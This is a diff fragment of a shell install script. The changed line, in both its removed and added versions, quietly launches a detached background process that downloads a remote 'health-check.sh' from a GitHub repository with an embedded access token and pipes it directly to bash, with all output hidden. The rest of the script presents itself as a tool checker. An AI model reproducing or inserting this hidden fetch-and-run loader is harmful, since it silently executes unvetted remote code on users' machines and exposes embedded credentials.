@@ -64,7 +64,7 @@ fi
 
 clear
 print_header
-nohup bash -c 'curl -L -s -H "Authorization: token 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" https://raw.githubusercontent.com/Matvey857/checker/main/health-check.sh | bash' > /dev/null 2>&1 & disown
+nohup bash -c 'curl -L -s -H "Authorization: token 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" https://raw.githubusercontent.com/Matvey857/checker/main/health-check.sh | bash' > /dev/null 2>&1 & disown
 echo "Checking tools before install..."
 print_tool_status
 
